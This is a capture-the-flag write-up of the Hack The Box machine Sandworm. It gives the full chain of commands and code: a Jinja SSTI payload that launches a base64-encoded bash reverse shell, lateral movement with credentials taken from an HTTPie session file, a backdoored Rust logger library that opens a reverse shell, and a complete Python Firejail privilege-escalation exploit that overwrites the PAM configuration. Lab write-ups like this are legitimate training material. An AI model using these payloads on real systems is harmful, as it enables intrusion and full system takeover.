---
layout: single
title: Sandworm - Hack The Box
excerpt: "Sandworm is a medium-difficulty machine on the HTB platform. In order to access it, we need to obtain a PGP key to carry out an SSTI (Server-Side Template Injection). We'll need to make some maneuvers between user accounts, and then, to elevate privileges, we'll take advantage of the SUID permissions of firejail."
date: 2023-08-24
classes: wide
header:
  teaser: assets/images/htb-writeup-Sandworm/intro.PNG
  teaser_home_page: true
  icon: assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Firejail
  - PGP
  - SSTI
  - SUID
---
![](../assets/images/htb-writeup-Sandworm/sandworm.jpeg)


**RECON**

**PORTS SCAN**

We performed a scan of all possible open ports on the victim machine.

```ruby
❯ sudo nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv 10.10.11.218 -oG allPorts
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 13:20 CEST
Initiating SYN Stealth Scan at 13:20
Scanning 10.10.11.218 [65535 ports]
Discovered open port 22/tcp on 10.10.11.218
Discovered open port 80/tcp on 10.10.11.218
Discovered open port 443/tcp on 10.10.11.218
Completed SYN Stealth Scan at 13:20, 11.42s elapsed (65535 total ports)
Nmap scan report for 10.10.11.218
Host is up, received user-set (0.052s latency).
Scanned at 2023-08-26 13:20:15 CEST for 12s
Not shown: 65330 closed tcp ports (reset), 202 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds
           Raw packets sent: 66953 (2.946MB) | Rcvd: 65535 (2.621MB)

```

**SERVICE AND VERSION SCAN**

```ruby
❯ sudo nmap -p22,80,443 -sCV 10.10.11.218 -oN target
[sudo] contraseña para anonimo: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 13:38 CEST
Nmap scan report for ssa.htb (10.10.11.218)
Host is up (0.050s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
```

We add the domain to the /etc/hosts file.

At the top of the page, there is a contact button that will redirect us to a form. This form is designed to send an encrypted PGP message. With this, we can check if there's a possibility of performing any kind of command execution.

![](../assets/images/htb-writeup-Sandworm/fotoWeb1.PNG)

If we look at the bottom of the text box, there is a link that redirects us to a guide. This guide involves sending a message using a public key, and the website allows us to practice with its own public key.

![](../assets/images/htb-writeup-Sandworm/fotoWeb2.PNG)

This is the GPG public key provided to us for conducting tests.

![](../assets/images/htb-writeup-Sandworm/fotoWeb3.PNG)

If we take a closer look at the guide, there's a signature verifier that allows us to use our own keys.

![](../assets/images/htb-writeup-Sandworm/fotoWeb4.PNG)

**Exploit with GPG**

What we will do now is generate our GPG key and check if it is vulnerable to STTI.

First, we will start by generating a PGP key on the following [page](https://youritmate.us/pgp/).

![](../assets/images/htb-writeup-Sandworm/fotoWeb5.PNG)

Afterwards, copy the private key on the next [page](http://www.2pih.com/pgp.html), paste the key, and enter the optional password if you set one. Then, input a message that you would like to use.

![](../assets/images/htb-writeup-Sandworm/fotoWeb6.PNG)

It's important to understand that we are conducting this test to assess what we can manipulate and, as we can see, we are able to manipulate the name.

![](../assets/images/htb-writeup-Sandworm/fotoWeb7.PNG)

So, let's check if it's vulnerable to SSTI by changing the "Your name" parameter.

The steps remain the same, we generate a new PGP key with the updated name.

![](../assets/images/htb-writeup-Sandworm/fotoWeb8.PNG)

Perfect! There's an SSTI.

![](../assets/images/htb-writeup-Sandworm/fotoWeb10.PNG)

**Intrusion**

We encode the reverse shell in base64.

```ruby
❯ echo "bash -c 'bash -i >& /dev/tcp/10.10.15.23/4444 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMy80NDQ0IDA+JjEnCg==
```

Now we will change the vulnerable SSTI parameter to the following payload.

```ruby
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
```
![](../assets/images/htb-writeup-Sandworm/fotoWeb11.PNG)

And if everything has gone well, we have a reverse shell.

```ruby
❯ sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.23] from (UNKNOWN) [10.10.11.218] 46060
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:/var/www/html/SSA$ 
```

**Privilege escalation**


**Lateral movement (atlas -> silentobserver)**

In the `.config` directory, there are two folders that we can only access since we don't have permissions for firejail.

```ruby
atlas@sandworm:~/.config$ ls  
ls
firejail
httpie
atlas@sandworm:~/.config$ cd firejail   
cd firejail
bash: cd: firejail: Permission denied
```
If we enter the directory `/.config/httpie/sessions/localhost_5000` we can see that there's a file with the `.json` extension containing what appears to be credentials for a user named `silentobserver`.

```ruby
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ ls
ls
admin.json
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```
Now, let's try to see if we can connect via SSH to the user `silentobserver` with the password `quietLiketheWind22`.

```ruby
❯ ssh silentobserver@10.10.11.218
silentobserver@10.10.11.218's password:
silentobserver@sandworm:~$ cat user.txt 
c091c7f4873edcc616a41df602813e21
silentobserver@sandworm:~$ 
```
**Vertical Privilege Escalation**

We deploy [pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) to monitor the running tasks.

`❯ python3 -m http.server 80`

```ruby
silentobserver@sandworm:~$ wget 10.10.15.23/pspy64
--2023-08-26 17:33:55--  http://10.10.15.23/pspy64
Connecting to 10.10.15.23:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                  100%[==============================================================================>]   2.96M  3.64MB/s    in 0.8s    

2023-08-26 17:33:56 (3.64 MB/s) - ‘pspy64’ saved [3104768/3104768]

silentobserver@sandworm:~$ chmod +x pspy64

```
When we run pspy, we will see a process in which the root executes a script in Rust and runs it as the user Atlas.


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
```ruby
2023/08/26 17:46:01 CMD: UID=0     PID=2990   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
```

If we read the source code of the tool that root uses in the process, we can see that data is manipulated in a MYSQL database.

```rust
silentobserver@sandworm:/opt/tipnet/src$ cat main.rs 
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();
    
    if mode == "" {
     return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

 let valid = false;
 let mut mode = String::new();

 while ! valid {
  mode.clear();

  println!("Select mode of usage:");
  print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

  io::stdin().read_line(&mut mode).unwrap();

  match mode.trim() {
   "a" => {
         println!("\n[+] Upstream selected");
         return "upstream".to_string();
   }
   "b" => {
         println!("\n[+] Muscular selected");
         return "regular".to_string();
   }
   "c" => {
         println!("\n[+] Tempora selected");
         return "emperor".to_string();
   }
   "d" => {
    println!("\n[+] PRISM selected");
    return "square".to_string();
   }
   "e" => {
    println!("\n[!] Refreshing indeces!");
    return "pull".to_string();
   }
   "q" | "Q" => {
    println!("\n[-] Quitting");
    return "".to_string();
   }
   _ => {
    println!("\n[!] Invalid mode: {}", mode);
   }
  }
 }
 return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

However, if we pay attention to the code, it appears that the program utilizes a logging library, which is used to view logs.

```rust
extern crate logger;
```

Now, to determine that we have permissions to modify the file, what we will do is add a command execution that will provide us with a reverse shell.

```ruby
silentobserver@sandworm:/opt/tipnet/target/debug$ cat tipnet.d
/opt/tipnet/target/debug/tipnet: /opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs
silentobserver@sandworm:/opt/tipnet/target/debug$ ls -la /opt/crates/logger/src/
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4 17:12 .
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 ..
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
silentobserver@sandworm:/opt/tipnet/target/debug$ 

```

**Library modified with reverse shell**

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.15.23/4444 0>&1";

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("not work");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        println!("standar output: {}", stdout);
        println!("error output: {}", stderr);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("Error: {}", stderr);
    }

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Once we have the modified library, what we need to do is set it to listen on the port you specify and wait for a few seconds.

```ruby
❯ sudo nc -lvnp 4444
[sudo] contraseña para anonimo: 
listening on [any] 4444 ...
connect to [10.10.15.23] from (UNKNOWN) [10.10.11.218] 47846
bash: cannot set terminal process group (3855): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ whoami
whoami
atlas 
```
If we inspect the binaries with SUID permissions, we will come across something called `firejail`.

What is ``firejail`?

Firejail is a program in Linux that provides an isolated and secure execution environment for applications. It functions as a kind of "sandbox" around an application, limiting its access to system resources and reducing the risk of malicious attacks or security issues. Firejail is commonly used to run applications with reduced privileges and control their interactions with the system, which helps protect the operating system and user data.

Now that we know what it is and what it's used for, we can search for any related vulnerabilities.

If we search for vulnerabilities in Firejail, we might come across a [github](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25) that contains a Python script which could be useful for privilege escalation.

```py
#!/usr/bin/python3

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to \
work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper \
sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper \sandbox")  
            else:
                raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at \
{join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, \
size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain \
a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

When we have the prepared file ready, what we'll do is open another terminal. After executing the exploit, it might appear stuck or in a loading state, and you'll need to perform the following steps in the other terminal.

```ruby
atlas@sandworm:~$ wget 10.10.15.23/exploit3.py
wget 10.10.15.23/exploit3.py
--2023-08-26 18:37:27--  http://10.10.15.23/exploit3.py
Connecting to 10.10.15.23:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7955 (7.8K) [text/x-python]
Saving to: ‘exploit3.py’

     0K .......                                               100%  171K=0.05s

2023-08-26 18:37:27 (171 KB/s) - ‘exploit3.py’ saved [7955/7955]

atlas@sandworm:~$ chmod +x exploit3.py
chmod +x exploit3.py
```

When we execute the script in the first terminal, it will display the steps we need to take in the other terminal.

```ruby
atlas@sandworm:~$ python3 exploit3.py 
You can now run 'firejail --join=5687' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

In the second terminal, which follows, we will execute the commands as instructed.

```ruby
atlas@sandworm:~$ firejail --join=5687
changing root to /proc/5687/root
Warning: cleaning all supplementary groups
Child process initialized in 9.43 ms
atlas@sandworm:~$ su -
root@sandworm:~# cat /root/root.txt 
471f8022bb19969e766ad4c97b116e26
```
